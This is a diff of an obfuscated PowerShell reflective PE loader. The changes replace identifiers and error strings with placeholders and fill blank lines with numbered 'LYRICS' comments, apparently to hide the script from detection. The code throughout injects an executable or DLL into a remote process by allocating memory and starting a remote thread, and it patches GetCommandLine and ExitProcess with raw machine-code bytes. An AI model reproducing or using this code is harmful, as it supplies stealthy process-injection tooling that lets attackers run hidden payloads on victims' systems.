             [IntPtr]$VAR0168 = $VAR0042.FUN041.Invoke($VAR0302)
             if ($VAR0168 -eq [IntPtr]::Zero) {
                 throw "ERROR33"
             }
-    
+# LYRICS767
             [IntPtr]$VAR0230 = $VAR0042.FUN041.Invoke("KernelBase.dll")
+# LYRICS768
             if ($VAR0230 -eq [IntPtr]::Zero) {
                 throw "ERROR34"
             }
-    
-            
-            
-            
+# LYRICS769
+# LYRICS770
+# LYRICS771
+# LYRICS772
             $VAR0231 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($VAR0227)
+# LYRICS773
             $VAR0232 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($VAR0227)
-    
+# LYRICS774
             [IntPtr]$VAR0233 = $VAR0042.FUN036.Invoke($VAR0230, "GetCommandLineA")
+# LYRICS775
             [IntPtr]$VAR0234 = $VAR0042.FUN036.Invoke($VAR0230, "GetCommandLineW")
-    
+# LYRICS776
             if ($VAR0233 -eq [IntPtr]::Zero -or $VAR0234 -eq [IntPtr]::Zero) {
+# LYRICS777
                 throw "ERROR36: $(FUN008 $VAR0233). ERROR37: $(FUN008 $VAR0234)"
             }
-    
-            
+# LYRICS778
+# LYRICS779
             [Byte[]]$VAR0235 = @()
+# LYRICS780
             if ($VAR0163 -eq 8) {
+# LYRICS781
                 $VAR0235 += 0x48 
             }
             $VAR0235 += 0xb8
-    
+# LYRICS782
             [Byte[]]$VAR0236 = 195
             $VAR0237 = $VAR0235.Length + $VAR0163 + $VAR0236.Length
-    
-            
+# LYRICS783
+# LYRICS784
             $VAR0238 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0237)
+# LYRICS785
             $VAR0239 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0237)
             $VAR0042.FUN033.Invoke($VAR0238, $VAR0233, [UInt64]$VAR0237) | Out-Null
             $VAR0042.FUN033.Invoke($VAR0239, $VAR0234, [UInt64]$VAR0237) | Out-Null
+# LYRICS786
             $VAR0229 += , ($VAR0233, $VAR0238, $VAR0237)
+# LYRICS787
             $VAR0229 += , ($VAR0234, $VAR0239, $VAR0237)
-    
-            
+# LYRICS788
+# LYRICS789
+# LYRICS790
             [UInt32]$VAR0226 = 0
             $Success = $VAR0042.FUN040.Invoke($VAR0233, [UInt32]$VAR0237, [UInt32]($VAR0041.CONST008), [Ref]$VAR0226)
+# LYRICS791
             if ($Success = $false) {
                 throw "ERROR39"
             }
-    
+# LYRICS792
             $VAR0240 = $VAR0233
             FUN010 -Bytes $VAR0235 -VAR0129 $VAR0240
+# LYRICS793
             $VAR0240 = FUN005 $VAR0240 ($VAR0235.Length)
             [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0232, $VAR0240, $false)
+# LYRICS794
             $VAR0240 = FUN005 $VAR0240 $VAR0163
+# LYRICS795
             FUN010 -Bytes $VAR0236 -VAR0129 $VAR0240
-    
+# LYRICS796
             $VAR0042.FUN040.Invoke($VAR0233, [UInt32]$VAR0237, [UInt32]$VAR0226, [Ref]$VAR0226) | Out-Null
-    
-    
-            
+# LYRICS797
+# LYRICS798
+# LYRICS799
             [UInt32]$VAR0226 = 0
             $Success = $VAR0042.FUN040.Invoke($VAR0234, [UInt32]$VAR0237, [UInt32]($VAR0041.CONST008), [Ref]$VAR0226)
+# LYRICS800
             if ($Success = $false) {
                 throw "ERROR40"
             }
-    
+# LYRICS801
             $VAR0234Temp = $VAR0234
+# LYRICS802
             FUN010 -Bytes $VAR0235 -VAR0129 $VAR0234Temp
             $VAR0234Temp = FUN005 $VAR0234Temp ($VAR0235.Length)
+# LYRICS803
             [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0231, $VAR0234Temp, $false)
+# LYRICS804
             $VAR0234Temp = FUN005 $VAR0234Temp $VAR0163
+# LYRICS805
             FUN010 -Bytes $VAR0236 -VAR0129 $VAR0234Temp
-    
+# LYRICS806
             $VAR0042.FUN040.Invoke($VAR0234, [UInt32]$VAR0237, [UInt32]$VAR0226, [Ref]$VAR0226) | Out-Null
-            
-    
-            
-            
-            
-            
-            
+# LYRICS807
+# LYRICS808
+# LYRICS809
+# LYRICS810
+# LYRICS811
+# LYRICS812
+# LYRICS813
             $VAR0241 = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
                     , "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll", "msvcr120.dll", "msvcrt.dll")
-    
+# LYRICS814
             foreach ($VAR0242 in $VAR0241) {
+# LYRICS815
                 [IntPtr]$VAR0243 = $VAR0042.FUN041.Invoke($VAR0242)
                 if ($VAR0243 -ne [IntPtr]::Zero) {
+# LYRICS816
                     [IntPtr]$VAR0244 = $VAR0042.FUN036.Invoke($VAR0243, "_wcmdln")
+# LYRICS817
                     [IntPtr]$VAR0245 = $VAR0042.FUN036.Invoke($VAR0243, "_acmdln")
                     if ($VAR0244 -eq [IntPtr]::Zero -or $VAR0245 -eq [IntPtr]::Zero) {
+# LYRICS818
                         "ERROR41"
                     }
-    
+# LYRICS819
                     $VAR0246 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($VAR0227)
+# LYRICS820
                     $VAR0247 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($VAR0227)
-    
-                    
+# LYRICS821
+# LYRICS822
+# LYRICS823
                     $VAR0248 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0245, [Type][IntPtr])
+# LYRICS824
                     $VAR0249 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0244, [Type][IntPtr])
                     $VAR0250 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0163)
                     $VAR0251 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0163)
+# LYRICS825
                     [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0248, $VAR0250, $false)
+# LYRICS826
                     [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0249, $VAR0251, $false)
                     $VAR0229 += , ($VAR0245, $VAR0250, $VAR0163)
+# LYRICS827
                     $VAR0229 += , ($VAR0244, $VAR0251, $VAR0163)
-    
+# LYRICS828
                     $Success = $VAR0042.FUN040.Invoke($VAR0245, [UInt32]$VAR0163, [UInt32]($VAR0041.CONST008), [Ref]$VAR0226)
                     if ($Success = $false) {
                         throw "ERROR42"
                     }
                     [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0246, $VAR0245, $false)
+# LYRICS829
                     $VAR0042.FUN040.Invoke($VAR0245, [UInt32]$VAR0163, [UInt32]($VAR0226), [Ref]$VAR0226) | Out-Null
-    
+# LYRICS830
+# LYRICS831
                     $Success = $VAR0042.FUN040.Invoke($VAR0244, [UInt32]$VAR0163, [UInt32]($VAR0041.CONST008), [Ref]$VAR0226)
                     if ($Success = $false) {
+# LYRICS832
                         throw "ERROR43"
                     }
                     [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0247, $VAR0244, $false)
+# LYRICS833
                     $VAR0042.FUN040.Invoke($VAR0244, [UInt32]$VAR0163, [UInt32]($VAR0226), [Ref]$VAR0226) | Out-Null
                 }
             }
-            
-    
-            
-            
-    
+# LYRICS834
+# LYRICS835
+# LYRICS836
+# LYRICS837
+# LYRICS838
             $VAR0229 = @()
+# LYRICS839
             $VAR0252 = @() 
-    
-            
+# LYRICS840
+# LYRICS841
             [IntPtr]$VAR0253 = $VAR0042.FUN041.Invoke("mscoree.dll")
+# LYRICS842
             if ($VAR0253 -eq [IntPtr]::Zero) {
+# LYRICS843
                 throw "ERROR44"
             }
             [IntPtr]$VAR0254 = $VAR0042.FUN036.Invoke($VAR0253, "CorExitProcess")
+# LYRICS844
             if ($VAR0254 -eq [IntPtr]::Zero) {
                 Throw "ERROR45"
+# LYRICS845
             }
             $VAR0252 += $VAR0254
-    
-            
+# LYRICS846
+# LYRICS847
             [IntPtr]$VAR0255 = $VAR0042.FUN036.Invoke($VAR0168, "ExitProcess")
+# LYRICS848
             if ($VAR0255 -eq [IntPtr]::Zero) {
                 Throw "ERROR46"
+# LYRICS849
             }
             $VAR0252 += $VAR0255
-    
+# LYRICS850
             [UInt32]$VAR0226 = 0
             foreach ($VAR0256 in $VAR0252) {
+# LYRICS851
                 $VAR0257 = $VAR0256
-                
-                
+# LYRICS852
+# LYRICS853
                 [Byte[]]$VAR0235 = 187
+# LYRICS854
                 [Byte[]]$VAR0236 = 198,3,1,131,236,32,131,228,192,187
-                
+# LYRICS855
                 if ($VAR0163 -eq 8) {
                     [Byte[]]$VAR0235 = 72,187
+# LYRICS856
                     [Byte[]]$VAR0236 = 198,3,1,72,131,236,32,102,131,228,192,72,187
                 }
                 [Byte[]]$VAR0258 = 255,211
+# LYRICS857
                 $VAR0237 = $VAR0235.Length + $VAR0163 + $VAR0236.Length + $VAR0163 + $VAR0258.Length
-    
+# LYRICS858
                 [IntPtr]$VAR0259 = $VAR0042.FUN036.Invoke($VAR0168, "ExitThread")
+# LYRICS859
                 if ($VAR0259 -eq [IntPtr]::Zero) {
                     Throw "ERROR47"
                 }
-    
+# LYRICS860
                 $Success = $VAR0042.FUN040.Invoke($VAR0256, [UInt32]$VAR0237, [UInt32]$VAR0041.CONST008, [Ref]$VAR0226)
+# LYRICS861
                 if ($Success -eq $false) {
                     Throw "ERROR48"
                 }
-    
-                
+# LYRICS862
+# LYRICS863
                 $VAR0260 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0237)
+# LYRICS864
                 $VAR0042.FUN033.Invoke($VAR0260, $VAR0256, [UInt64]$VAR0237) | Out-Null
+# LYRICS865
                 $VAR0229 += , ($VAR0256, $VAR0260, $VAR0237)
-    
-                
-                
+# LYRICS866
+# LYRICS867
+# LYRICS868
                 FUN010 -Bytes $VAR0235 -VAR0129 $VAR0257
                 $VAR0257 = FUN005 $VAR0257 ($VAR0235.Length)
+# LYRICS869
                 [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0228, $VAR0257, $false)
                 $VAR0257 = FUN005 $VAR0257 $VAR0163
+# LYRICS870
                 FUN010 -Bytes $VAR0236 -VAR0129 $VAR0257
                 $VAR0257 = FUN005 $VAR0257 ($VAR0236.Length)
+# LYRICS871
                 [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0259, $VAR0257, $false)
+# LYRICS872
                 $VAR0257 = FUN005 $VAR0257 $VAR0163
+# LYRICS873
                 FUN010 -Bytes $VAR0258 -VAR0129 $VAR0257
-    
+# LYRICS874
                 $VAR0042.FUN040.Invoke($VAR0256, [UInt32]$VAR0237, [UInt32]$VAR0226, [Ref]$VAR0226) | Out-Null
             }
-            
-    
+# LYRICS875
+# LYRICS876
             Write-Output $VAR0229
         }
-
-        
-        
+# LYRICS877
+# LYRICS878
+# LYRICS879
         Function FUN026 {
+# LYRICS880
             Param(
                 [Parameter(Position = 0, Mandatory = $true)]
                 [Array[]]
                 $VAR0261,
-
+# LYRICS881
                 [Parameter(Position = 1, Mandatory = $true)]
                 [System.Object]
                 $VAR0042,
-
+# LYRICS882
                 [Parameter(Position = 2, Mandatory = $true)]
                 [System.Object]
                 $VAR0041
             )
-
+# LYRICS883
             [UInt32]$VAR0226 = 0
             foreach ($VAR0262 in $VAR0261) {
+# LYRICS884
                 $Success = $VAR0042.FUN040.Invoke($VAR0262[0], [UInt32]$VAR0262[2], [UInt32]$VAR0041.CONST008, [Ref]$VAR0226)
+# LYRICS885
                 if ($Success -eq $false) {
                     Throw "ERROR50"
                 }
-
+# LYRICS886
                 $VAR0042.FUN033.Invoke($VAR0262[0], $VAR0262[1], [UInt64]$VAR0262[2]) | Out-Null
-
+# LYRICS887
+# LYRICS888
                 $VAR0042.FUN040.Invoke($VAR0262[0], [UInt32]$VAR0262[2], [UInt32]$VAR0226, [Ref]$VAR0226) | Out-Null
             }
         }
-
-
-        
-        
-        
+# LYRICS889
+# LYRICS890
+# LYRICS891
+# LYRICS892
+# LYRICS893
         Function FUN027 {
+# LYRICS894
             Param(
                 [Parameter(Position = 0, Mandatory = $true)]
                 [IntPtr]
                 $VAR0263,
-
+# LYRICS895
                 [Parameter(Position = 1, Mandatory = $true)]
                 [String]
                 $VAR0187
             )
-
+# LYRICS896
             $VAR010 = FUN001
+# LYRICS897
             $VAR0041 = FUN002
+# LYRICS898
             $VAR0126 = FUN017 -VAR0263 $VAR0263 -VAR010 $VAR010 -VAR0041 $VAR0041
-
-            
+# LYRICS899
+# LYRICS900
             if ($VAR0126.CONST031.CONST122.CONST107.Size -eq 0) {
+# LYRICS901
                 return [IntPtr]::Zero
             }
             $VAR0264 = FUN005 ($VAR0263) ($VAR0126.CONST031.CONST122.CONST107.CONST074)
+# LYRICS902
             $VAR0265 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0264, [Type]$VAR010.CONST155)
-
+# LYRICS903
             for ($i = 0; $i -lt $VAR0265.CONST159; $i++) {
-                
+# LYRICS904
                 $VAR0266 = FUN005 ($VAR0263) ($VAR0265.CONST161 + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
+# LYRICS905
                 $VAR0267 = FUN005 ($VAR0263) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0266, [Type][UInt32]))
+# LYRICS906
                 $VAR0268 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($VAR0267)
-
+# LYRICS907
                 if ($VAR0268 -ceq $VAR0187) {
-                    
-                    
+# LYRICS908
+# LYRICS909
                     $VAR0269 = FUN005 ($VAR0263) ($VAR0265.CONST162 + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
+# LYRICS910
                     $VAR0270 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0269, [Type][UInt16])
+# LYRICS911
                     $VAR0271 = FUN005 ($VAR0263) ($VAR0265.CONST160 + ($VAR0270 * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
+# LYRICS912
                     $VAR0272 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0271, [Type][UInt32])
                     return FUN005 ($VAR0263) ($VAR0272)
                 }
             }
-
+# LYRICS913
             return [IntPtr]::Zero
         }
-
-
+# LYRICS914
+# LYRICS915
         Function FUN028 {
+# LYRICS916
             Param(
                 [Parameter( Position = 0, Mandatory = $true )]
                 [Byte[]]
                 $VAR001,
-
+# LYRICS917
                 [Parameter(Position = 1, Mandatory = $false)]
                 [String]
                 $VAR004,
-
+# LYRICS918
                 [Parameter(Position = 2, Mandatory = $false)]
                 [IntPtr]
                 $VAR0161,
-
+# LYRICS919
                 [Parameter(Position = 3)]
                 [Bool]
                 $VAR007 = $false
             )
-
+# LYRICS920
             $VAR0163 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
-
-            
+# LYRICS921
+# LYRICS922
             $VAR0041 = FUN002
             $VAR0042 = FUN003
+# LYRICS923
             $VAR010 = FUN001
-
+# LYRICS924
             $VAR0210 = $false
             if (($VAR0161 -ne $null) -and ($VAR0161 -ne [IntPtr]::Zero)) {
+# LYRICS925
                 $VAR0210 = $true
             }
-
-            
+# LYRICS926
+# LYRICS927
             $VAR0126 = FUN016 -VAR001 $VAR001 -VAR010 $VAR010
+# LYRICS928
             $VAR0196 = $VAR0126.VAR0196
             $VAR0273 = $true
+# LYRICS929
             if (([Int] $VAR0126.CONST035 -band $VAR0041.CONST024) -ne $VAR0041.CONST024) {
-
+# LYRICS930
                 $VAR0273 = $false
             }
-
-            
+# LYRICS931
+# LYRICS932
             $VAR0274 = $true
+# LYRICS933
             if ($VAR0210 -eq $true) {
                 $VAR0168 = $VAR0042.FUN041.Invoke($VAR0302)
+# LYRICS934
                 $VAR0144 = $VAR0042.FUN036.Invoke($VAR0168, "IsWow64Process")
+# LYRICS935
                 if ($VAR0144 -eq [IntPtr]::Zero) {
                     Throw "ERROR52"
                 }
-
+# LYRICS936
                 [Bool]$VAR0275 = $false
                 $Success = $VAR0042.FUN055.Invoke($VAR0161, [Ref]$VAR0275)
+# LYRICS937
                 if ($Success -eq $false) {
                     Throw "ERROR53"
                 }
-
+# LYRICS938
                 if (($VAR0275 -eq $true) -or (($VAR0275 -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4))) {
+# LYRICS939
                     $VAR0274 = $false
                 }
-
-                
+# LYRICS940
+# LYRICS941
                 $VAR0276 = $true
                 if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8) {
+# LYRICS942
                     $VAR0276 = $false
                 }
                 if ($VAR0276 -ne $VAR0274) {
@@ -2081,33 +2537,39 @@ function FUN000 {
             }
             else {
                 if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8) {
+# LYRICS943
                     $VAR0274 = $false
                 }
             }
             if ($VAR0274 -ne $VAR0126.CONST032) {
+# LYRICS944
                 Throw "ERROR55"
             }
-
-            
-
-            
+# LYRICS945
+# LYRICS946
+# LYRICS947
+# LYRICS948
             [IntPtr]$VAR0277 = [IntPtr]::Zero
+# LYRICS949
             $VAR0278 = ([Int] $VAR0126.CONST035 -band $VAR0041.CONST023) -eq $VAR0041.CONST023
             if ((-not $VAR007) -and (-not $VAR0278)) {
+# LYRICS950
                 Write-Warning "ERROR56" -WarningAction Continue
                 [IntPtr]$VAR0277 = $VAR0196
             }
-            
-
-
+# LYRICS951
+# LYRICS952
+# LYRICS953
             $VAR0263 = [IntPtr]::Zero              
+# LYRICS954
             $VAR0279 = [IntPtr]::Zero     
             if ($VAR0210 -eq $true) {
-                
+# LYRICS955
                 $VAR0263 = $VAR0042.FUN031.Invoke([IntPtr]::Zero, [UIntPtr]$VAR0126.CONST033, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST005)
-
-                
+# LYRICS956
+# LYRICS957
                 $VAR0279 = $VAR0042.FUN032.Invoke($VAR0161, $VAR0277, [UIntPtr]$VAR0126.CONST033, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST008)
+# LYRICS958
                 if ($VAR0279 -eq [IntPtr]::Zero) {
                     Throw "ERROR57"
                 }
@@ -2115,172 +2577,203 @@ function FUN000 {
             else {
                 if ($VAR0273 -eq $true) {
                     $VAR0263 = $VAR0042.FUN031.Invoke($VAR0277, [UIntPtr]$VAR0126.CONST033, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST005)
+# LYRICS959
                 }
                 else {
                     $VAR0263 = $VAR0042.FUN031.Invoke($VAR0277, [UIntPtr]$VAR0126.CONST033, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST008)
+# LYRICS960
                 }
                 $VAR0279 = $VAR0263
             }
-
+# LYRICS961
             [IntPtr]$VAR0128 = FUN005 ($VAR0263) ([Int64]$VAR0126.CONST033)
             if ($VAR0263 -eq [IntPtr]::Zero) {
                 Throw "ERROR58."
             }
+# LYRICS962
             [System.Runtime.InteropServices.Marshal]::Copy($VAR001, 0, $VAR0263, $VAR0126.CONST034) | Out-Null
-
-
-            
+# LYRICS963
+# LYRICS964
+# LYRICS965
             $VAR0126 = FUN017 -VAR0263 $VAR0263 -VAR010 $VAR010 -VAR0041 $VAR0041
+# LYRICS966
             $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST038 -Value $VAR0128
             $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST039 -Value $VAR0279
-            
-
+# LYRICS967
+# LYRICS968
             FUN020 -VAR001 $VAR001 -VAR0126 $VAR0126 -VAR0042 $VAR0042 -VAR010 $VAR010
-
-
-            
+# LYRICS969
+# LYRICS970
+# LYRICS971
             FUN021 -VAR0126 $VAR0126 -VAR0196 $VAR0196 -VAR0041 $VAR0041 -VAR010 $VAR010
-
-
-            
+# LYRICS972
+# LYRICS973
+# LYRICS974
             if ($VAR0210 -eq $true) {
                 FUN022 -VAR0126 $VAR0126 -VAR0042 $VAR0042 -VAR010 $VAR010 -VAR0041 $VAR0041 -VAR0161 $VAR0161
             }
             else {
                 FUN022 -VAR0126 $VAR0126 -VAR0042 $VAR0042 -VAR010 $VAR010 -VAR0041 $VAR0041
             }
-
-
-            
+# LYRICS975
+# LYRICS976
+# LYRICS977
             if ($VAR0210 -eq $false) {
                 if ($VAR0273 -eq $true) {
-
+# LYRICS978
                     FUN024 -VAR0126 $VAR0126 -VAR0042 $VAR0042 -VAR0041 $VAR0041 -VAR010 $VAR010
                 }
-                
+# LYRICS979
             }
-            
-
-
-            
+# LYRICS980
+# LYRICS981
+# LYRICS982
+# LYRICS983
             if ($VAR0210 -eq $true) {
                 [UInt32]$VAR0167 = 0
+# LYRICS984
                 $Success = $VAR0042.FUN045.Invoke($VAR0161, $VAR0279, $VAR0263, [UIntPtr]($VAR0126.CONST033), [Ref]$VAR0167)
+# LYRICS985
                 if ($Success -eq $false) {
                     Throw "ERROR59"
                 }
             }
-
-
-            
+# LYRICS986
+# LYRICS987
+# LYRICS988
             if ($VAR0126.CONST037 -ieq "Library") {
+# LYRICS989
                 if ($VAR0210 -eq $false) {
-
+# LYRICS990
                     $VAR0280 = FUN005 ($VAR0126.VAR0263) ($VAR0126.CONST031.CONST122.CONST060)
+# LYRICS991
                     $VAR0281 = FUN011 @([IntPtr], [UInt32], [IntPtr]) ([Bool])
+# LYRICS992
                     $VAR0282 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0280, $VAR0281)
-
+# LYRICS993
                     $VAR0282.Invoke($VAR0126.VAR0263, 1, [IntPtr]::Zero) | Out-Null
                 }
                 else {
                     $VAR0280 = FUN005 ($VAR0279) ($VAR0126.CONST031.CONST122.CONST060)
-
+# LYRICS994
                     if ($VAR0126.CONST032 -eq $true) {
-                        
+# LYRICS995
                         $VAR0283 = 83,72,137,227,102,131,228,0,72,185
+# LYRICS996
                         $VAR0284 = 186,1,0,0,0,65,184,0,0,0,0,72,184
+# LYRICS997
                         $VAR0285 = 255,208,72,137,220,91,195
                     }
                     else {
-                        
+# LYRICS998
                         $VAR0283 = 83,137,227,131,228,240,185
+# LYRICS999
                         $VAR0284 = 186,1,0,0,0,184,0,0,0,0,80,82,81,184
                         $VAR0285 = 255,208,137,220,91,195
                     }
                     $VAR0171 = $VAR0283.Length + $VAR0284.Length + $VAR0285.Length + ($VAR0163 * 2)
+# LYRICS1000
                     $VAR0172 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0171)
                     $VAR0173 = $VAR0172
-
+# LYRICS1001
                     FUN010 -Bytes $VAR0283 -VAR0129 $VAR0172
                     $VAR0172 = FUN005 $VAR0172 ($VAR0283.Length)
+# LYRICS1002
                     [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0279, $VAR0172, $false)
                     $VAR0172 = FUN005 $VAR0172 ($VAR0163)
                     FUN010 -Bytes $VAR0284 -VAR0129 $VAR0172
+# LYRICS1003
                     $VAR0172 = FUN005 $VAR0172 ($VAR0284.Length)
                     [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0280, $VAR0172, $false)
+# LYRICS1004
                     $VAR0172 = FUN005 $VAR0172 ($VAR0163)
+# LYRICS1005
                     FUN010 -Bytes $VAR0285 -VAR0129 $VAR0172
                     $VAR0172 = FUN005 $VAR0172 ($VAR0285.Length)
-
+# LYRICS1006
                     $VAR0178 = $VAR0042.FUN032.Invoke($VAR0161, [IntPtr]::Zero, [UIntPtr][UInt64]$VAR0171, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST008)
+# LYRICS1007
                     if ($VAR0178 -eq [IntPtr]::Zero) {
+# LYRICS1008
                         Throw "ERROR60"
                     }
-
+# LYRICS1009
                     $Success = $VAR0042.FUN045.Invoke($VAR0161, $VAR0178, $VAR0173, [UIntPtr][UInt64]$VAR0171, [Ref]$VAR0167)
+# LYRICS1010
                     if (($Success -eq $false) -or ([UInt64]$VAR0167 -ne [UInt64]$VAR0171)) {
                         Throw "ERROR61"
                     }
-
+# LYRICS1011
                     $VAR0179 = FUN014 -VAR0151 $VAR0161 -VAR0127 $VAR0178 -VAR0042 $VAR0042
+# LYRICS1012
                     $VAR0144 = $VAR0042.FUN044.Invoke($VAR0179, 20000)
+# LYRICS1013
                     if ($VAR0144 -ne 0) {
                         Throw "ERROR62"
                     }
-
+# LYRICS1014
                     $VAR0042.FUN039.Invoke($VAR0161, $VAR0178, [UIntPtr][UInt64]0, $VAR0041.CONST025) | Out-Null
                 }
             }
             elseif ($VAR0126.CONST037 -ieq "Executable") {
-                
+# LYRICS1015
                 [IntPtr]$VAR0228 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
+# LYRICS1016
                 [System.Runtime.InteropServices.Marshal]::WriteByte($VAR0228, 0, 0x00)
+# LYRICS1017
                 $VAR0286 = FUN025 -VAR0126 $VAR0126 -VAR0042 $VAR0042 -VAR0041 $VAR0041 -VAR0227 $VAR004 -VAR0228 $VAR0228
-
-                
-                
+# LYRICS1018
+# LYRICS1019
+# LYRICS1020
                 [IntPtr]$VAR0287 = FUN005 ($VAR0126.VAR0263) ($VAR0126.CONST031.CONST122.CONST060)
-                
+# LYRICS1021
                 $VAR0042.FUN056.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $VAR0287, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null
-
+# LYRICS1022
                 while ($true) {
                     [Byte]$VAR0288 = [System.Runtime.InteropServices.Marshal]::ReadByte($VAR0228, 0)
+# LYRICS1023
                     if ($VAR0288 -eq 1) {
+# LYRICS1024
                         FUN026 -VAR0261 $VAR0286 -VAR0042 $VAR0042 -VAR0041 $VAR0041
                         break
                     }
                     else {
+# LYRICS1025
                         Start-Sleep -Seconds 1
                     }
                 }
             }
-
+# LYRICS1026
             return @($VAR0126.VAR0263, $VAR0279)
         }
-
-
+# LYRICS1027
+# LYRICS1028
         Function FUN029 {
+# LYRICS1029
             Param(
                 [Parameter(Position = 0, Mandatory = $true)]
                 [IntPtr]
                 $VAR0263
             )
-
-            
+# LYRICS1030
+# LYRICS1031
             $VAR0041 = FUN002
             $VAR0042 = FUN003
+# LYRICS1032
             $VAR010 = FUN001
-
+# LYRICS1033
             $VAR0126 = FUN017 -VAR0263 $VAR0263 -VAR010 $VAR010 -VAR0041 $VAR0041
-
-            
+# LYRICS1034
+# LYRICS1035
             if ($VAR0126.CONST031.CONST122.CONST108.Size -gt 0) {
+# LYRICS1036
                 [IntPtr]$VAR0211 = FUN005 ([Int64]$VAR0126.VAR0263) ([Int64]$VAR0126.CONST031.CONST122.CONST108.CONST074)
-
+# LYRICS1037
                 while ($true) {
+# LYRICS1038
                     $VAR0212 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0211, [Type]$VAR010.CONST152)
-
-                    
+# LYRICS1039
+# LYRICS1040
                     if ($VAR0212.CONST067 -eq 0 `
                             -and $VAR0212.CONST154 -eq 0 `
                             -and $VAR0212.CONST153 -eq 0 `
@@ -2288,50 +2781,59 @@ function FUN000 {
                             -and $VAR0212.CONST071 -eq 0) {
                         break
                     }
-
+# LYRICS1041
                     $VAR0164 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((FUN005 ([Int64]$VAR0126.VAR0263) ([Int64]$VAR0212.Name)))
+# LYRICS1042
                     $VAR0213 = $VAR0042.FUN041.Invoke($VAR0164)
-
-                    
-
+# LYRICS1043
+# LYRICS1044
+# LYRICS1045
                     $Success = $VAR0042.FUN042.Invoke($VAR0213)
-                    
-
+# LYRICS1046
+# LYRICS1047
                     $VAR0211 = FUN005 ($VAR0211) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST152))
                 }
             }
-
-            
+# LYRICS1048
+# LYRICS1049
             $VAR0280 = FUN005 ($VAR0126.VAR0263) ($VAR0126.CONST031.CONST122.CONST060)
+# LYRICS1050
             $VAR0281 = FUN011 @([IntPtr], [UInt32], [IntPtr]) ([Bool])
+# LYRICS1051
             $VAR0282 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0280, $VAR0281)
-
+# LYRICS1052
             $VAR0282.Invoke($VAR0126.VAR0263, 0, [IntPtr]::Zero) | Out-Null
-
-
+# LYRICS1053
+# LYRICS1054
             $Success = $VAR0042.FUN038.Invoke($VAR0263, [UInt64]0, $VAR0041.CONST025)
-            
+# LYRICS1055
         }
-
-
+# LYRICS1056
+# LYRICS1057
         Function FUN030 {
             $VAR0042 = FUN003
             $VAR010 = FUN001
+# LYRICS1058
             $VAR0041 = FUN002
-
+# LYRICS1059
             $VAR0161 = [IntPtr]::Zero
-
-            
+# LYRICS1060
+# LYRICS1061
             if (($VAR005 -ne $null) -and ($VAR005 -ne 0) -and ($VAR006 -ne $null) -and ($VAR006 -ne "")) {
+# LYRICS1062
                 Throw "ERROR64"
             }
             elseif ($VAR006 -ne $null -and $VAR006 -ne "") {
+# LYRICS1063
                 $VAR0289 = @(Get-Process -Name $VAR006 -ErrorAction SilentlyContinue)
+# LYRICS1064
                 if ($VAR0289.Count -eq 0) {
                     Throw "ERROR65 $VAR006"
                 }
                 elseif ($VAR0289.Count -gt 1) {
+# LYRICS1065
                     $VAR0290 = Get-Process | Where-Object { $_.Name -eq $VAR006 } | Select-Object ProcessName, Id, SessionId
+# LYRICS1066
                     Write-Output $VAR0290
                     Throw "ERROR66 $VAR006"
                 }
@@ -2339,159 +2841,195 @@ function FUN000 {
                     $VAR005 = $VAR0289[0].ID
                 }
             }
-
-            
-            
-            
-            
-            
-            
-            
-
+# LYRICS1067
+# LYRICS1068
+# LYRICS1069
+# LYRICS1070
+# LYRICS1071
+# LYRICS1072
+# LYRICS1073
